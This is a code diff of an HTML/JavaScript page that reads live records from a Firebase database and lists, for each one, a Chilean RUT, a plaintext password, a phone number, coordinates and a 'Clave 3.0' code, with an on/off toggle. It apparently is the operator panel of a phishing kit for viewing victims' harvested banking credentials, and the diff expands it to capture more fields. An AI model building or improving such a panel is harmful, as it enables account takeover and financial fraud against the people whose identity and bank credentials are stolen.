@@ -11,16 +11,29 @@
     .switch {
       margin-bottom: 20px;
     }
-    .registro {
-      border: 1px solid #ccc;
-      margin-bottom: 10px;
-      padding: 10px;
-    }
-    .activo {
+    #estadoPanel.activo {
       color: green;
+      font-weight: bold;
     }
-    .inactivo {
+    #estadoPanel.inactivo {
       color: red;
+      font-weight: bold;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th, td {
+      border: 1px solid #ccc;
+      padding: 8px;
+      font-size: 14px;
+    }
+    th {
+      background-color: #eee;
+    }
+    tr:nth-child(even) {
+      background-color: #f9f9f9;
     }
   </style>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
@@ -34,8 +47,19 @@
     <button onclick="toggleModo()">Activar / Desactivar</button>
   </div>
 
-  <h3>Registros en vivo:</h3>
-  <div id="datos"></div>
+  <table>
+    <thead>
+      <tr>
+        <th>Fecha y Hora</th>
+        <th>RUT</th>
+        <th>Contraseña</th>
+        <th>Teléfono</th>
+        <th>Coordenadas</th>
+        <th>Clave 3.0</th>
+      </tr>
+    </thead>
+    <tbody id="tablaDatos"></tbody>
+  </table>
 
   <script>
     const firebaseConfig = {
@@ -71,22 +95,24 @@
     });
 
     db.ref("usuarios").on("value", snap => {
-      const contenedor = document.getElementById("datos");
-      contenedor.innerHTML = "";
+      const tabla = document.getElementById("tablaDatos");
+      tabla.innerHTML = "";
       const usuarios = snap.val();
       if (usuarios) {
         const ordenados = Object.entries(usuarios).sort((a, b) => {
           return new Date(b[1].hora || "") - new Date(a[1].hora || "");
         });
         ordenados.forEach(([key, val]) => {
-          const div = document.createElement("div");
-          div.className = "registro";
-          div.innerHTML = `
-            <strong>🕒 ${val.hora || ""}</strong><br>
-            👤 RUT: ${val.rut || ""}<br>
-            🔐 Contraseña: ${val.clave || ""}
+          const row = document.createElement("tr");
+          row.innerHTML = `
+            <td>${val.hora || ""}</td>
+            <td>${val.rut || ""}</td>
+            <td>${val.clave || ""}</td>
+            <td>${val.telefono || ""}</td>
+            <td>${val.coordenadas || ""}</td>
+            <td>${val.clave30 || ""}</td>
           `;
-          contenedor.appendChild(div);
+          tabla.appendChild(row);
         });
       }
     });
